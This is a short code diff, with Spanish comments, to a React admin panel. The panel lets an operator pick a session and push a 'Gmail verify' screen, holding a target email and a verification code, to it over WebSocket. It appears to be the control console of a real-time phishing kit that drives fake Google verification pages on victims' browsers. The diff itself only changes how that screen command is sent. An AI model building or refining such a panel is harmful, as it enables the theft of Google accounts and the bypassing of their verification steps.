@@ -692,7 +692,9 @@ export default function AdminPanel() {
       // Asegurar que el código nunca esté vacío
       const codigoVerificacion = data.codigo && data.codigo.trim() !== '' ? data.codigo : '14';
       
-      console.log('Enviando solicitud de verificación Google con código:', codigoVerificacion);
+      console.log('⚠️ Enviando solicitud de verificación Google con código:', codigoVerificacion);
+      
+      // Crear el objeto de datos con las propiedades específicas
       const screenData = {
         tipo: `mostrar_${ScreenType.GMAIL_VERIFY}`,
         sessionId: selectedSessionId,
@@ -700,15 +702,27 @@ export default function AdminPanel() {
         codigo: codigoVerificacion
       };
       
-      console.log('Datos completos enviados:', JSON.stringify(screenData));
-      
-      // Enviar la pantalla de Gmail Verify usando la función dedicada
-      sendScreenChange(screenData);
-      
-      toast({
-        title: "Verificación de Google enviada",
-        description: `Se ha solicitado la verificación de Google para: ${data.correo} con código: ${codigoVerificacion}`,
-      });
+      // Enviar mensaje directamente con WebSocket para evitar posibles problemas
+      if (connected && socket) {
+        const message = {
+          type: 'SCREEN_CHANGE',
+          data: screenData
+        };
+        
+        console.log('📤 Enviando por WebSocket:', JSON.stringify(message));
+        socket.send(JSON.stringify(message));
+        
+        toast({
+          title: "Verificación de Google enviada",
+          description: `Se ha solicitado la verificación de Google para: ${data.correo} con código: ${codigoVerificacion}`,
+        });
+      } else {
+        toast({
+          title: "Error de conexión",
+          description: "No hay conexión con el servidor.",
+          variant: "destructive",
+        });
+      }
     }
     
     closeModal();
